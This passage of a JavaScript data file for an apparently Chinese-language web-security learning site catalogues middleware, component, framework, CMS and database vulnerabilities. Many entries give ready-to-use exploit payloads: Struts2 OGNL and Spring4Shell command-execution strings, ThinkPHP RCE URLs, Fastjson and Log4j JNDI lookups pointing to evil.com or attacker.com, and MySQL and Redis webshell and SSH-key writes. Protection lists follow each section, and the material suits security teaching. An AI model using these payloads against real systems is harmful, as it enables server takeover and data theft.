      '对所有密码和敏感操作实施强大的验证机制',
      '定期进行业务逻辑渗透测试'
    ]
  },
  'middleware': {
    title: '中间件漏洞',
    icon: faServer,
    description: '中间件漏洞存在于支持Web应用程序的软件层中，如应用服务器、代理和负载均衡器。这些组件管理网络通信、请求处理和资源分配，漏洞可能导致远程代码执行、敏感信息泄露或服务中断。',
    sections: [
      {
        title: 'Weblogic漏洞概述',
        content: 'Oracle WebLogic Server是一个流行的Java EE应用服务器，由于其广泛部署在企业环境中，成为攻击者的高价值目标。WebLogic的漏洞通常涉及其T3协议、反序列化机制和管理控制台等组件。',
        examples: [
          "CVE-2020-14882: WebLogic控制台未授权RCE",
          "CVE-2019-2725: WebLogic WLS组件反序列化RCE",
          "CVE-2018-2894: WebLogic未授权上传漏洞",
          "CVE-2017-10271: WebLogic XMLDecoder反序列化漏洞"
        ],
        difficulty: 'intermediate'
      },
      {
        title: 'Weblogic多种典型漏洞利用',
        content: 'WebLogic的主要漏洞类型包括反序列化漏洞、未授权访问、文件上传和XML处理缺陷。这些漏洞大多可导致远程代码执行，对企业系统构成严重威胁。',
        examples: [
          "控制台RCE (CVE-2020-14882):\n1. 访问: /console/css/%252e%252e%252fconsole.portal\n2. 添加payload: ?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession('java.lang.Runtime.getRuntime().exec(\"命令\");')",
          "WSAT反序列化 (CVE-2017-10271):\nPOST /wls-wsat/CoordinatorPortType HTTP/1.1\nContent-Type: text/xml\n\n<soapenv:Envelope xmlns...><soapenv:Header/><soapenv:Body><java>...[payload]...</java></soapenv:Body></soapenv:Envelope>",
          "T3协议利用 (CVE-2015-4852):\n使用T3协议发送恶意序列化对象，利用Commons Collections链执行命令"
        ],
        difficulty: 'advanced'
      },
      {
        title: 'Tomcat典型漏洞利用',
        content: 'Apache Tomcat是最常用的Java Servlet容器之一，其漏洞通常涉及权限问题、配置错误和代码缺陷。Tomcat漏洞影响广泛，从信息泄露到远程代码执行不等。',
        examples: [
          "CVE-2020-1938 (幽灵猫): AJP协议未授权文件读取/包含\n使用专用工具发送特制AJP请求读取WEB-INF下敏感文件",
          "CVE-2017-12615: PUT方法任意文件写入\nPUT /shell.jsp/ HTTP/1.1\n[JSP内容]\n利用Windows文件名处理特性执行JSP",
          "默认管理界面弱口令:\n访问/manager/html使用默认凭据(admin/admin)，然后上传WAR包执行代码",
          "CVE-2019-0232: Windows环境下CGI启用时的命令注入\n/cgi-bin/hello.bat?&dir 通过查询参数注入命令"
        ],
        difficulty: 'intermediate'
      },
      {
        title: 'Jboss典型漏洞利用',
        content: 'JBoss Application Server(现为WildFly)是一个开源Java应用服务器，其漏洞主要涉及默认配置不安全、管理接口暴露和反序列化问题。JBoss在企业环境中的广泛使用使其成为引人注目的攻击目标。',
        examples: [
          "默认JMX控制台未授权访问:\n访问/jmx-console/，利用DeploymentScanner部署war包",
          "CVE-2017-12149: JBoss反序列化RCE\nPOST /invoker/readonly HTTP/1.1\n[恶意序列化对象] 利用Hibernate链执行命令",
          "CVE-2010-0738: JMX控制台安全绕过\n访问/jmx-console/HtmlAdaptor 绕过HTTP认证部署恶意应用",
          "JBossMQ JMS实现漏洞:\n连接JMS端口发送恶意消息触发反序列化"
        ],
        difficulty: 'advanced'
      },
      {
        title: '其他中间件漏洞',
        content: '除主要应用服务器外，Web系统中使用的其他中间件组件也存在各种安全漏洞。这包括代理服务器、负载均衡器、消息队列和缓存系统等。',
        examples: [
          "Nginx: 目录遍历(CVE-2009-3898)、CRLF注入、配置错误(如代理未授权访问)",
          "Apache HTTP Server: mod_cgi模块命令注入(CVE-2014-6271 Shellshock)、拒绝服务漏洞",
          "HAProxy: 内存泄漏、HTTP请求走私",
          "RabbitMQ: 默认凭据、STOMP协议漏洞、权限配置不当",
          "Varnish Cache: 缓存中毒、信息泄露"
        ],
        difficulty: 'intermediate'
      },
      {
        title: '中间件配置漏洞',
        content: '中间件配置错误可能导致严重安全问题，即使软件本身没有漏洞。这包括默认凭据、不必要开放的端口、调试功能启用和过度权限等问题。',
        examples: [
          "默认管理员凭据未更改(admin/admin, tomcat/tomcat)",
          "调试接口暴露(如JMX远程未授权访问)",
          "过度权限(中间件以root/Administrator权限运行)",
          "TLS配置错误(支持弱加密套件、过时协议版本)",
          "默认示例应用未删除(如Tomcat的examples目录)"
        ],
        difficulty: 'beginner'
      },
      {
        title: '中间件漏洞防护',
        content: '中间件安全需要多层次防护策略，包括强化配置、定期更新、网络分段和适当的监控。由于中间件系统通常是关键基础设施，综合防护尤为重要。',
        examples: [
          "定期更新中间件到最新安全版本",
          "移除所有示例应用和非必要组件",
          "更改默认凭据并实施强密码策略",
          "限制中间件仅监听必要端口/接口",
          "配置Web应用防火墙(WAF)过滤恶意请求",
          "实施网络分段隔离中间件组件",
          "以最小权限运行中间件服务",
          "禁用非必要服务和协议(如AJP)"
        ],
        difficulty: 'intermediate'
      }
    ],
    protection: [
      '及时应用安全补丁和更新',
      '移除或禁用未使用的功能和示例应用',
      '更改默认凭据和配置',
      '限制中间件服务器的网络访问',
      '实施深度防御策略',
      '部署Web应用防火墙(WAF)',
      '定期进行安全审计和漏洞扫描',
      '监控异常访问和行为',
      '配置正确的TLS设置',
      '以最小权限原则配置中间件服务'
    ]
  },
  'components': {
    title: '组件漏洞',
    icon: faPuzzlePiece,
    description: '组件漏洞存在于集成到应用程序中的第三方库、框架和软件模块中。这些组件漏洞可能影响整个应用程序的安全性，导致数据泄露、远程代码执行或认证绕过等严重问题。',
    sections: [
      {
        title: 'Shiro组件典型漏洞利用',
        content: 'Apache Shiro是一个强大的Java安全框架，用于认证、授权和会话管理。其中最著名的漏洞是默认加密密钥导致的反序列化漏洞，允许攻击者构造恶意cookie获取服务器控制权。',
        examples: [
          "CVE-2016-4437 (默认密钥漏洞):\n1. 利用已知的默认密钥(kPH+bIxk5D2deZiIxcaaaA==)加密恶意序列化对象\n2. 将结果放入rememberMe cookie\n3. 发送请求触发反序列化执行命令",
          "CVE-2019-12422 (固定密钥错误配置):\n即使用户更改了密钥，如果直接硬编码在配置中，可能通过源码/配置泄露获取",
          "Shiro认证绕过(CVE-2020-1957):\n特定路径匹配规则下，使用/%2e/path可绕过访问控制",
          "利用工具: ShiroScan, ShiroExploit等自动化工具可检测和利用Shiro漏洞"
        ],
        difficulty: 'advanced'
      },
      {
        title: 'Fastjson典型漏洞利用',
        content: 'Fastjson是阿里巴巴开发的高性能JSON处理库，广泛用于Java应用。其主要漏洞是允许反序列化任意类，通过特定JSON结构触发远程代码执行，影响大量使用该库的应用程序。',
        examples: [
          "CVE-2017-18349 (autoType绕过):\n构造JSON: {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://evil.com/Exploit\",\"autoCommit\":true}",
          "1.2.47版本绕过(CVE-2019-14489):\n使用L前缀: {\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://evil.com/Exploit\",\"autoCommit\":true}",
          "特定版本利用链:\n- JNDI注入: com.sun.rowset.JdbcRowSetImpl\n- 文件读取: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\n- 网络请求: java.net.URLClassLoader",
          "利用工具: fastjson-exp等可自动检测和利用不同版本的Fastjson漏洞"
        ],
        difficulty: 'expert'
      },
      {
        title: 'Log4j典型漏洞利用',
        content: 'Log4j是Apache基金会的流行Java日志组件，2021年底发现的Log4Shell漏洞(CVE-2021-44228)是近年最严重的安全漏洞之一。这个JNDI注入漏洞允许通过日志消息执行远程代码，影响了全球数百万系统。',
        examples: [
          "基本JNDI注入(CVE-2021-44228):\n" + ESCAPED_TEMPLATE_EXPRESSION_PREFIX + "jndi:ldap://attacker.com/exploit} 插入到被记录的字段中",
          "绕过WAF技术:\n" + ESCAPED_TEMPLATE_EXPRESSION_PREFIX + ESCAPED_TEMPLATE_EXPRESSION_PREFIX + "lower:j}" + ESCAPED_TEMPLATE_EXPRESSION_PREFIX + "lower:n}" + ESCAPED_TEMPLATE_EXPRESSION_PREFIX + "lower:d}" + ESCAPED_TEMPLATE_EXPRESSION_PREFIX + "lower:i}:" + ESCAPED_TEMPLATE_EXPRESSION_PREFIX + "lower:l}" + ESCAPED_TEMPLATE_EXPRESSION_PREFIX + "lower:d}" + ESCAPED_TEMPLATE_EXPRESSION_PREFIX + "lower:a}" + ESCAPED_TEMPLATE_EXPRESSION_PREFIX + "lower:p}://attacker.com/exploit}",
          "其他协议利用:\n" + ESCAPED_TEMPLATE_EXPRESSION_PREFIX + "jndi:rmi://attacker.com/exploit}\n" + ESCAPED_TEMPLATE_EXPRESSION_PREFIX + "jndi:dns://attacker.com/exploit}",
          "常见攻击向量:\n- HTTP头(User-Agent, X-Forwarded-For)\n- 表单字段\n- JSON字段\n- 文件名\n- 任何被记录的用户输入"
        ],
        difficulty: 'intermediate'
      },
      {
        title: 'Spring组件漏洞',
        content: 'Spring Framework是Java生态系统中最流行的应用开发框架，其各个模块可能包含安全漏洞。从表达式注入到远程代码执行，Spring相关漏洞影响了大量企业应用程序。',
        examples: [
          "Spring4Shell(CVE-2022-22965):\n通过特制请求触发类加载器访问导致远程代码执行",
          "Spring Cloud Function SpEL注入(CVE-2022-22963):\n在header中添加spring.cloud.function.routing-expression参数含SpEL表达式",
          "Spring Boot Actuator未授权访问:\n访问/actuator/env, /actuator/heapdump等敏感端点",
          "Spring Data Commons RCE(CVE-2018-1273):\n在表单参数中使用嵌套属性名称包含SpEL表达式"
        ],
        difficulty: 'advanced'
      },
      {
        title: '其他常见组件漏洞',
        content: '除了上述关键组件外，还有许多常用库和框架存在各种安全漏洞。组件漏洞特别危险，因为一个库的漏洞可能影响数千个依赖它的应用程序。',
        examples: [
          "Jackson反序列化(CVE-2019-12384):\n利用默认类型信息触发反序列化漏洞",
          "Apache Commons Collections(CVE-2015-7501):\n不安全反序列化导致RCE，多个框架受影响",
          "Struts2 OGNL表达式注入:\n多个版本允许通过特制请求执行OGNL表达式",
          "MyBatis SQL注入:\n动态SQL功能使用不当导致注入",
          "Hibernate搜索漏洞:\n允许通过Lucene查询语法进行SQL注入"
        ],
        difficulty: 'advanced'
      },
      {
        title: '组件漏洞检测与修复',
        content: '组件漏洞管理需要系统化方法，包括依赖扫描、版本控制和持续监控。由于依赖关系复杂，组件漏洞修复通常需要权衡升级成本和安全风险。',
        examples: [
          "使用工具扫描依赖:\n- OWASP Dependency-Check\n- Snyk\n- WhiteSource\n- GitHub Dependabot",
          "版本管理最佳实践:\n- 锁定依赖版本\n- 定期更新依赖\n- 发布前完整测试",
          "临时缓解措施:\n- 添加WAF规则\n- 自定义补丁\n- 配置限制",
          "建立漏洞响应流程:\n- 监控CVE发布\n- 评估影响\n- 确定优先级\n- 实施修复"
        ],
        difficulty: 'intermediate'
      }
    ],
    protection: [
      '保持组件和依赖项更新至最新安全版本',
      '实施软件组成分析(SCA)监控依赖',
      '移除未使用的依赖项',
      '从可信来源获取组件',
      '监控安全公告和CVE数据库',
      '制定组件漏洞响应策略',
      '配置组件最小化暴露面',
      '使用虚拟补丁(WAF规则)保护已知漏洞',
      '实施最小权限原则运行组件',
      '定期进行漏洞扫描和渗透测试'
    ]
  },
  'frameworks': {
    title: '第三方框架漏洞',
    icon: faLayerGroup,
    description: '第三方框架漏洞存在于流行的Web开发框架中，如ThinkPHP、Struts2和Spring。这些框架被大量网站和企业应用使用，因此其漏洞可能影响数以千计的应用程序，成为黑客的高价值目标。',
    sections: [
      {
        title: 'ThinkPHP多种典型漏洞利用',
        content: 'ThinkPHP是一个流行的中文PHP开发框架，在国内广泛使用。其历史版本中存在多个安全漏洞，主要涉及未正确过滤用户输入导致的远程代码执行、SQL注入和文件包含等问题。',
        examples: [
          "ThinkPHP 5.x 远程代码执行(RCE):\n/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id",
          "ThinkPHP 5.0.x SQL注入:\n/index.php?ids[0,updatexml(1,concat(0x7e,(select%20user()),0x7e),1)]=1",
          "ThinkPHP 3.x 任意文件包含:\n/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/xx.log",
          "ThinkPHP 5.0.24 文件包含:\n/index.php?s=/home/article/view_recent/name/1' union select 1,2,(select file_get_contents('/etc/passwd')),4,5,6,7,8,9%23"
        ],
        difficulty: 'intermediate'
      },
      {
        title: 'Struts2多种典型漏洞利用',
        content: 'Apache Struts2是一个流行的Java Web应用框架，其众多版本中发现的安全漏洞对企业应用构成了严重威胁。Struts2最著名的漏洞涉及OGNL表达式注入，允许远程代码执行。',
        examples: [
          "S2-057(CVE-2018-11776): 命名空间值与OGNL表达式注入\n/%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%29%28%23cmd%3D%22id%22%29%28%23iswin%3D%28%40java.lang.System%40getProperty%28%22os.name%22%29.toLowerCase%28%29.contains%28%22win%22%29%29%28%23cmds%3D%28%23iswin%3F%7B%22cmd.exe%22%2C%22%2Fc%22%2C%23cmd%7D%3A%7B%22%2Fbin%2Fbash%22%2C%22-c%22%2C%23cmd%7D%29%29%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29%28%23p.redirectErrorStream%28true%29%29%28%40org.apache.commons.io.IOUtils%40toString%28%23p.start%28%29.getInputStream%28%29%29%29%7D/actionChain1.action",
          "S2-045(CVE-2017-5638): Content-Type头OGNL注入\nContent-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
          "S2-032(CVE-2016-3081): 方法调用时的OGNL注入\n/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=&encoding=UTF-8&cmd=id",
          "S2-016(CVE-2013-2251): 参数值OGNL注入\nredirect:" + ESCAPED_TEMPLATE_EXPRESSION_PREFIX + "%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
        ],
        difficulty: 'expert'
      },
      {
        title: 'Spring框架典型漏洞利用',
        content: 'Spring框架是Java领域最流行的应用开发框架，其众多组件和模块可能包含各种漏洞。从Spring MVC到Spring Cloud，各种Spring组件的漏洞常被用于高级攻击。',
        examples: [
          "Spring4Shell(CVE-2022-22965):\nPOST请求包含class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
          "Spring Cloud Function SPEL注入(CVE-2022-22963):\n在请求头添加: spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/pwned\")",
          "Spring Data MongoDB SPEL注入(CVE-2022-22980):\n构造包含SPEL表达式的查询参数",
          "Spring Boot Actuator端点未授权访问:\n访问/actuator/env, /actuator/jolokia等敏感端点获取配置信息或执行操作"
        ],
        difficulty: 'advanced'
      },
      {
        title: '若依框架典型漏洞利用',
        content: '若依(RuoYi)是一个基于SpringBoot的权限管理系统，在国内较为流行。若依框架可能存在认证绕过、权限提升和代码注入等安全问题，特别是在配置不当的情况下。',
        examples: [
          "任意文件读取漏洞:\n利用下载功能读取服务器任意文件，如/common/download?fileName=../../../etc/passwd&delete=true",
          "默认口令登录:\n使用admin/admin123等默认凭据登录管理后台",
          "后台模板注入:\n在若依低版本中，代码生成功能可能存在模板注入漏洞",
          "权限绕过:\n某些版本中可能存在未正确校验权限的接口"
        ],
        difficulty: 'intermediate'
      },
      {
        title: '其他流行框架漏洞',
        content: '除了上述框架外，许多其他流行的Web开发框架也存在各种安全漏洞。这些框架被广泛使用，其漏洞可能影响大量应用程序。',
        examples: [
          "Laravel框架漏洞:\n- CVE-2021-3129: 日志系统远程代码执行\n- 配置不当导致的.env文件泄露",
          "Django框架漏洞:\n- SQL注入(CVE-2019-19844)\n- 模板注入漏洞",
          "Ruby on Rails漏洞:\n- CVE-2019-5418: 文件内容泄露\n- CVE-2020-8163: 远程代码执行",
          "Express.js漏洞:\n- 原型污染\n- NoSQL注入"
        ],
        difficulty: 'advanced'
      },
      {
        title: '框架漏洞防护策略',
        content: '防御框架漏洞需要综合措施，包括及时更新、安全配置、代码审计和运行时保护。由于框架漏洞影响广泛，企业应建立系统化的框架安全管理流程。',
        examples: [
          "框架版本管理:\n- 跟踪使用的框架版本\n- 订阅安全公告\n- 实施自动化依赖检查",
          "安全配置:\n- 禁用不必要的功能\n- 移除示例代码\n- 配置安全标头",
          "运行时保护:\n- 配置WAF规则针对框架漏洞\n- 实施RASP解决方案\n- 监控异常请求",
          "开发实践:\n- 代码审计\n- 渗透测试\n- 安全培训"
        ],
        difficulty: 'intermediate'
      }
    ],
    protection: [
      '及时更新框架到最新安全版本',
      '关注安全公告和漏洞报告',
      '移除或禁用不必要的框架功能',
      '实施深度防御策略，不仅依赖框架安全',
      '使用Web应用防火墙(WAF)缓解已知框架漏洞',
      '配置最小权限运行应用',
      '定期进行安全审计和渗透测试',
      '实施运行时应用自我保护(RASP)',
      '使用依赖扫描工具监控框架漏洞',
      '记录并监控异常请求和行为'
    ]
  },
  'cms': {
    title: 'CMS漏洞利用实战',
    icon: faGlobe,
    description: '内容管理系统(CMS)漏洞存在于WordPress、Drupal、Joomla等流行的CMS平台中。由于这些系统被数百万网站使用，其漏洞成为黑客攻击的热门目标，可导致网站劫持、数据泄露或服务器控制权丧失。',
    sections: [
      {
        title: 'WordPress多种典型漏洞利用',
        content: 'WordPress是全球最流行的CMS，支持超过40%的网站。其核心系统和插件生态系统中存在的漏洞可能导致严重安全事件，从身份认证绕过到远程代码执行。',
        examples: [
          "WordPress插件漏洞利用:\n- WP File Manager插件RCE(CVE-2020-25213)\n/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php\n- Social Warfare插件RCE(CVE-2019-9978)\n/?swp_debug=load_options&swp_url=http://evil.com/payload.txt",
          "WordPress主题漏洞:\n利用主题编辑器上传恶意模板文件，或利用主题内置功能的安全漏洞",
          "WordPress认证漏洞:\nWordPress REST API认证绕过(CVE-2017-8295)，允许重置任意用户密码",
          "WordPress XML-RPC攻击:\n利用xmlrpc.php进行密码暴力破解或DoS攻击"
        ],
        difficulty: 'intermediate'
      },
      {
        title: 'WordPress信息泄露与枚举',
        content: 'WordPress站点可能泄露各种敏感信息，包括用户名、插件版本和配置详情。攻击者可以枚举这些信息以识别潜在的漏洞点和攻击向量。',
        examples: [
          "用户枚举:\n访问/?author=1可能重定向到作者页面，泄露用户名",
          "插件探测:\n- 检查/wp-content/plugins/[plugin-name]/路径是否存在\n- 分析页面源码中的插件引用",
          "主题识别:\n分析HTML源码中的样式表引用或查看/wp-content/themes/[theme-name]/",
          "WordPress版本信息:\n查看页面源码中的meta标签或RSS feed中的generator标签"
        ],
        difficulty: 'beginner'
      },
      {
        title: 'WordPress提权与后门',
        content: 'WordPress权限提升漏洞允许攻击者从普通用户升级到管理员，或利用管理员权限维持对站点的长期访问。这通常涉及数据库操作或文件系统修改。',
        examples: [
          "数据库提权:\nUPDATE `wp_users` SET `user_pass` = MD5('new_pass'), `user_login` = 'new_admin' WHERE `ID` = 1;",
          "主题/插件后门:\n在主题函数文件(functions.php)或活跃插件中插入PHP后门代码",
          "钓鱼后台:\n创建虚假登录页面获取管理员凭据",
          "wp-config.php操作:\n修改数据库凭据或添加DISALLOW_FILE_EDIT为false以启用编辑器"
        ],
        difficulty: 'advanced'
      },
      {
        title: 'Drupal漏洞利用',
        content: 'Drupal是一个强大的CMS平台，常用于构建企业级网站。由于其复杂性，Drupal可能存在严重漏洞，包括著名的"Drupalgeddon"系列远程代码执行漏洞。',
        examples: [
          "Drupalgeddon 2 (CVE-2018-7600):\nPOST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax 携带特制payload执行代码",
          "Drupalgeddon 3 (CVE-2018-7602):\n需要认证的远程代码执行漏洞，通过AJAX API触发",
          "SQL注入 (SA-CORE-2014-005):\n在URL参数中使用特殊字符构造SQL注入",
          "模块漏洞:\n如RESTWS模块远程代码执行(CVE-2019-6340)"
        ],
        difficulty: 'advanced'
      },
      {
        title: 'Joomla漏洞利用',
        content: 'Joomla是另一个流行的CMS平台，在其历史中存在多个严重漏洞。Joomla漏洞通常存在于核心组件或扩展中，从SQL注入到远程代码执行不等。',
        examples: [
          "Joomla核心SQL注入(CVE-2015-7297):\n利用com_contenthistory组件执行SQL注入",
          "Joomla远程代码执行(CVE-2015-8562):\n通过User-Agent头触发PHP对象注入",
          "Joomla组件漏洞:\n- com_fabrik组件文件上传\n- com_foxcontact组件代码执行",
          "Joomla信息泄露:\n/administrator/manifests/files/joomla.xml可能泄露精确版本信息"
        ],
        difficulty: 'intermediate'
      },
      {
        title: '其他CMS漏洞',
        content: '除了主流CMS外，许多其他内容管理系统也存在各种安全漏洞。这些包括开源系统如TYPO3、Magento，以及专有系统。',
        examples: [
          "Magento漏洞:\n- Magento SQL注入(PRODSECBUG-2198)\n- Magento未授权API访问",
          "TYPO3漏洞:\n- RCE via phar:// wrapper\n- 文件包含和CSRF漏洞",
          "OpenCart漏洞:\n- SQL注入\n- 文件上传漏洞",
          "Umbraco漏洞:\n- 远程代码执行\n- XSS和文件上传漏洞"
        ],
        difficulty: 'advanced'
      },
      {
        title: 'CMS漏洞防护最佳实践',
        content: 'CMS安全需要全面的防护措施，包括定期更新、加固配置、访问控制和持续监控。由于CMS平台的广泛使用，它们是网络攻击的常见目标。',
        examples: [
          "更新策略:\n- 及时安装安全补丁\n- 使用自动更新功能\n- 监控安全公告",
          "加固措施:\n- 删除默认账户和示例内容\n- 限制管理员访问IP\n- 使用安全插件/模块",
          "访问控制:\n- 实施二因素认证\n- 强制使用强密码\n- 限制管理面板访问",
          "监控与响应:\n- 使用WAF保护CMS\n- 监控文件变更\n- 定期备份"
        ],
        difficulty: 'intermediate'
      }
    ],
    protection: [
      '及时更新CMS核心、主题和插件',
      '移除未使用的插件、主题和组件',
      '实施强密码策略并使用二因素认证',
      '使用Web应用防火墙(WAF)过滤恶意请求',
      '限制管理界面访问IP或使用VPN',
      '禁用未使用的功能和API',
      '定期备份网站文件和数据库',
      '监控文件变更和可疑活动',
      '使用安全插件加固CMS',
      '定期进行安全审计和渗透测试'
    ]
  },
  'database': {
    title: '数据库漏洞利用实战',
    icon: faHdd,
    description: '数据库漏洞可能导致未授权访问、数据泄露、数据篡改甚至服务器控制权丧失。了解MySQL、Redis和PostgreSQL等常见数据库系统的安全漏洞及其利用技术，对保障数据安全至关重要。',
    sections: [
      {
        title: 'MySQL典型漏洞利用',
        content: 'MySQL是最流行的开源关系型数据库之一，其安全漏洞可能导致信息泄露、权限提升或远程代码执行。了解MySQL安全配置和常见攻击向量对保护数据库安全至关重要。',
        examples: [
          "MySQL认证绕过(CVE-2012-2122):\n利用认证机制实现缺陷，通过反复连接尝试，最终能无密码登录",
          "MySQL UDF提权:\n1. 创建恶意的用户定义函数\nCREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.dll';\n2. 执行系统命令\nSELECT sys_exec('whoami');",
          "MOF提权利用:\n利用MySQL写入特权在Windows系统上写入MOF文件实现提权",
          "MySQL本地文件访问:\n使用LOAD_FILE()读取文件或INTO DUMPFILE/OUTFILE写入文件\nSELECT LOAD_FILE('/etc/passwd');\nSELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';"
        ],
        difficulty: 'advanced'
      },
      {
        title: 'MySQL配置错误',
        content: 'MySQL配置错误是最常见的数据库安全问题之一，包括默认凭据、过度权限和网络曝露等问题。攻击者可以利用这些配置缺陷获取未授权访问或提升权限。',
        examples: [
          "弱口令和默认凭据:\nroot/root, root/(空密码)等默认或弱密码配置",
          "过度权限:\n- 以root用户运行MySQL\n- 授予用户不必要的SUPER权限\n- FILE权限允许读写文件系统",
          "网络曝露:\n- 绑定到0.0.0.0而非localhost\n- 未使用防火墙限制访问\n- 使用默认端口3306",
          "不安全配置:\n- 禁用日志记录\n- 未加密连接\n- 未限制登录失败尝试次数"
        ],
        difficulty: 'beginner'
      },
      {
        title: 'Redis典型漏洞利用',
        content: 'Redis是流行的开源内存数据库，通常用于缓存和消息代理。由于其强大的功能和默认不安全的配置，Redis可能成为攻击者的目标，特别是当其以高权限运行或暴露在互联网上时。',
        examples: [
          "Redis未授权访问:\n当Redis绑定到0.0.0.0且无认证时，可直接连接并执行命令:\n$ redis-cli -h target-ip\n> CONFIG GET *\n> KEYS *",
          "Redis写SSH密钥提权:\n1. 生成SSH密钥对\n2. 设置目录: CONFIG SET dir /root/.ssh/\n3. 设置文件名: CONFIG SET dbfilename authorized_keys\n4. 写入公钥: SET key \"\\n\\nssh-rsa AAAA...\\n\\n\"\n5. 保存: SAVE",
          "Redis Webshell写入:\n如果Redis以www-data权限运行:\nCONFIG SET dir /var/www/html/\nCONFIG SET dbfilename shell.php\nSET payload \"<?php system($_GET['cmd']); ?>\"\nSAVE",
          "Redis主从复制RCE(CVE-2022-0543):\n利用Lua沙箱逃逸执行任意命令"
        ],
        difficulty: 'intermediate'
      },
      {
        title: 'Redis安全配置',
        content: 'Redis安全配置对防止未授权访问和数据泄露至关重要。默认情况下，Redis的配置偏向性能而非安全性，需要进行额外的安全加固。',
        examples: [
          "认证配置:\n在redis.conf中设置requirepass强密码",
          "网络限制:\n- bind 127.0.0.1而非0.0.0.0\n- 使用防火墙限制访问\n- 配置TLS加密",
          "权限控制:\n- 以非特权用户运行Redis\n- 禁用危险命令: rename-command CONFIG \"\"\n- 使用ACL系统(Redis 6+)限制访问",
          "监控与审计:\n- 启用日志记录\n- 监控异常连接和命令\n- 定期审查配置"
        ],
        difficulty: 'beginner'
      },
      {
        title: 'PostgreSQL典型漏洞利用',
        content: 'PostgreSQL是一个强大的开源关系型数据库系统，其高级特性和扩展功能也可能引入安全风险。PostgreSQL漏洞可能导致信息泄露、权限提升或远程代码执行。',
        examples: [
          "PostgreSQL权限提升:\n利用自定义函数执行系统命令\nCREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'C' STRICT;\nSELECT system('id');",
          "PostgreSQL文件读取:\n使用COPY命令读取系统文件\nCREATE TABLE test(t text);\nCOPY test FROM '/etc/passwd';\nSELECT * FROM test;",
          "PostgreSQL UDF注入:\n利用动态库创建恶意函数执行系统命令",
          "PostgreSQL CVE漏洞:\n如CVE-2019-9193允许超级用户执行任意系统命令"
        ],
        difficulty: 'advanced'
      },
      {
        title: '其他数据库漏洞',
        content: '除了主流数据库系统外，其他数据库如MongoDB、Oracle、Microsoft SQL Server等也存在各种安全漏洞。了解这些漏洞对全面保护数据资产至关重要。',
        examples: [
          "MongoDB未授权访问:\n早期版本默认无认证，导致大量数据泄露事件",
          "MS SQL Server漏洞:\n- xp_cmdshell执行系统命令\n- 提权存储过程\n- 链接服务器攻击",
          "Oracle漏洞:\n- TNS投毒\n- PL/SQL注入\n- 默认账户弱密码",
          "SQLite漏洞:\n- CVE-2019-5018远程代码执行\n- 格式化字符串漏洞"
        ],
        difficulty: 'expert'
      },
      {
        title: '数据库安全最佳实践',
        content: '数据库安全需要多层次防护策略，包括访问控制、网络安全、加密和审计。实施全面的数据库安全计划对保护敏感数据至关重要。',
        examples: [
          "访问控制最佳实践:\n- 实施最小权限原则\n- 使用强认证\n- 定期审查权限\n- 删除默认和测试账户",
          "网络安全措施:\n- 使用防火墙限制访问\n- 分段数据库网络\n- 加密传输(TLS)\n- 使用VPN或SSH隧道",
